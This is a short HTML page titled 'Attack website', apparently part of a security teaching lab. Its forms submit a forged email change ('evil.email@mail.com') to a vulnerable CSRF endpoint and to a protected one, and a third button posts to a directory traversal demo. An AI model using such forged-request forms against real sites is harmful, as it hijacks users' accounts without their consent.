<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Attack website 💀</title>
</head>
<body>
    <ul>
        <form action="/CSRF/vulnerable-csrf.php" method="POST">
            <label for="email">Email to change:</label>
            <input type="email" id="email" name="email" value="evil.email@mail.com">
            <button type="submit">Vulnerable CSRF</button>
        </form>
        <form action="/CSRF/safe-csrf.php" method="POST">
            <label for="email">Email to change:</label>
            <input type="email" id="email" name="email" value="evil.email@mail.com">
            <button type="submit">Safe CSRF</button>
        </form>
        <form action="/DT/dt.php" method="POST">
            <button type="submit">DT</button>
        </form>
    </ul>
</body>
</html>